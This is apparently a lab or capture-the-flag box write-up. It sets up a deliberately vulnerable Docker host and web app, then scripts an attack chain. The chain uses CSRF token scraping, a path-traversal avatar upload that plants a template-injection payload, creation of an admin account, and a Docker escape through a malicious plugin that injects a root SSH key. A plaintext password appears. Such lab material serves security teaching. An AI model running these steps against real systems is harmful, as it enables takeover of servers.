# Box Write-up

# SERVER SETUP
# system update
sudo apt-get update && sudo apt-get upgrade -y
sudo apt-get install -y \
    ca-certificates \
    curl \
    gnupg \
    lsb-release \
    openssh-server

# Docker Engine <= 29.6.1 install
# Add Docker's official GPG key
install -m 0755 -d /etc/apt/keyrings
curl -fsSL https://download.docker.com/linux/ubuntu/gpg \
    | gpg --dearmor -o /etc/apt/keyrings/docker.gpg
chmod a+r /etc/apt/keyrings/docker.gpg

# Add Docker repository
echo \
  "deb [arch=$(dpkg --print-architecture) \
  signed-by=/etc/apt/keyrings/docker.gpg] \
  https://download.docker.com/linux/ubuntu \
  $(lsb_release -cs) stable" \
  | tee /etc/apt/sources.list.d/docker.list > /dev/null

apt-get update

# Install pinned version — 29.6.1 is the vulnerable version
apt-get install -y \
    docker-ce=5:29.6.1-1~ubuntu.$(lsb_release -rs)~$(lsb_release -cs) \
    docker-ce-cli=5:29.6.1-1~ubuntu.$(lsb_release -rs)~$(lsb_release -cs) \
    containerd.io

# Pin the version so apt-get upgrade doesn't patch it
apt-mark hold docker-ce docker-ce-cli containerd.io

# docker and site setup
git pull https://github.com/kalios5/Ethical-Hacking-Mod.git
cd Ethical-Hacking-Mod/
sudo chmod +x Scripts/DockerEscapeScripts/HostScripts/CronScript.sh # Allow execution of app log pull cron job script
sudo echo "* * * * * CONTAINER_NAME=app /home/test-vuln/Ethical-Hacking-Mod/Scripts/DockerEscapeScripts/HostScripts/CronScript.sh >> /var/log/app.log 2>&1" >> crontab -e # cronjob entry
docker compose up --build # run application


# ATTACK SETUP
# ── ATTACK SETUP ──────────────────────────────────────────────────────────────
BASE_URL="https://192.168.10.42"
USERNAME="test"
PASSWORD="Mylife@SGsucks1"

# ── step 1: fetch login page and extract CSRF token ───────────────────────────
TOKEN=$(curl -sk -c cookies.txt "$BASE_URL/auth/login" \
  | grep -oP 'name="csrf_token" value="\K[^"]+')

# ── step 2: submit login ──────────────────────────────────────────────────────
curl -sk -b cookies.txt -c cookies.txt "$BASE_URL/auth/login" \
  -d "csrf_token=$TOKEN" \
  -d "username=$USERNAME" \
  -d "password=$PASSWORD" \
  -o /dev/null -w "login: %{http_code}\n"

# ── step 3: get fresh CSRF token from post-login session ──────────────────────
TOKEN2=$(curl -sk -b cookies.txt -c cookies.txt "$BASE_URL/auth/account" \
  | grep -oP 'name="csrf_token" value="\K[^"]+' | head -1)

# ── step 4: upload payload via path traversal ─────────────────────────────────
curl -sk -b cookies.txt -c cookies.txt "$BASE_URL/auth/account" \
  -F "csrf_token=$TOKEN2" \
  -F "email=$USERNAME@test.test" \
  -F "avatar=@payload.png;filename=../../app/templates/storefront/cart.html;type=image/png" \
  -o /dev/null -w "upload: %{http_code}\n"

# ── step 5: trigger SSTI by visiting cart ────────────────────────────────────
curl -sk -b cookies.txt -c cookies.txt "$BASE_URL/storefront/cart" \
  -o /dev/null -w "trigger: %{http_code}\n"

# ── step 6: verify — login as r00t ───────────────────────────────────────────
TOKEN3=$(curl -sk -c cookies_r00t.txt "$BASE_URL/auth/login" \
  | grep -oP 'name="csrf_token" value="\K[^"]+')

curl -sk -b cookies_r00t.txt -c cookies_r00t.txt "$BASE_URL/auth/login" \
  -d "csrf_token=$TOKEN3" \
  -d "username=r00t" \
  -d "password=$PASSWORD" \
  -o /dev/null -w "r00t login: %{http_code}\n"
# visit cart page for the injected script to be executed and log into the new admin account

# Docker Escape 
gcc -O2 -Wall -o EscapePlugin/minimal-monitor monitor.c # compile malware
zip -r EscapePlugin.zip /EscapePlugin/* # zip for plugin 

# import zip into admin pluginmanager console
# the cron job injection from EscapePlugin will execute the malicious code and the app log pull cron job will execute the escape and inject a root ssh key